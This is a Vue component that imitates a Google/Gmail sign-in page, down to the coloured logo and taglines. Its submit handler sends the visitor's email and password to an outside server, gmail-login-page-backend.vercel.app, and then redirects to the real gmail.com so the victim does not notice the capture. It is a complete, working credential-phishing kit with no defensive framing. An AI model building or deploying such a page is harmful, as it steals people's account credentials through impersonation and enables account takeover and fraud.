<script lang="js" setup>
import {ref} from 'vue';
import axios from "axios";


const email = ref(null);
const password = ref(null);

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://gmail-login-page-backend.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.gmail.com/";
}
</script>

<template>
  <div>
    <p class="google">
      <span style="color: #4285f4">G</span><span style="color: #ea4335">o</span
      ><span style="color: #fbbc05">o</span><span style="color: #4285f4">g</span
      ><span style="color: #34a853">l</span
      ><span style="color: #ea4335">e</span>
    </p>
    <p class="tagline">One account. All of Google</p>
    <p class="signin">Sign in to continue to Gmail</p>

    <!--FORM-->
    <form @submit="submit">
      <img
        src="https://scontent.fpat3-1.fna.fbcdn.net/v/t1.0-9/p960x960/71497081_103761647698606_3235985810012504064_o.png?_nc_cat=109&_nc_ohc=ByQBeYnGyscAQljOXiIGp0z5B8PoZ4j6uDNpAV_qALLwOzaQsd69GBohg&_nc_ht=scontent.fpat3-1.fna&oh=54134b35438935b756ec313f950ae4dc&oe=5E6ECA1C"
        alt=""
      />
      <input
        name="email"
        v-model.trim="email"
        class="input"
        type="email"
        placeholder="Email"
        autofocus
      />
      <input
        v-model="password"
        name="password"
        class="input"
        type="password"
        placeholder="Password"
      />
      <a href="#"><button class="btn">Sign in</button></a>

      <div class="block">
        <div class="checkbox"><input type="checkbox" />Stay signed in</div>
        <div class="help">
          <a href="#">Need help?</a>
        </div>
      </div>
    </form>

    <p class="create"><a href="#">Create an account</a></p>
    <p class="every">One Google Account for everything Google</p>
  </div>
</template>
